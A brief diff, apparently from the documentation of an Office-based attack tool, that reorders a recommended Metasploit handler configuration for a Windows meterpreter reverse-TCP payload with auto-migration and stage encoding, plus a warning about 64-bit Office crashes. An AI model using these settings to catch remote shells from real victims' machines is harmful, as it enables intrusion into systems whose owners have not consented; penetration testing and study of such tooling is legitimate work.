@@ -310,9 +310,9 @@ Recommended msfconsole options (use exploit/multi/handler):
 set PAYLOAD windows/meterpreter/reverse_tcp
 set AutoRunScript post/windows/manage/smart_migrate
 set EXITFUNC thread
+set ExitOnSession false
 set EnableUnicodeEncoding true
 set EnableStageEncoding true
-set ExitOnSession false
 ```
 
 Warning: This is a 32 bit meterpreter so it will crash Office if Office 64bit is installed!
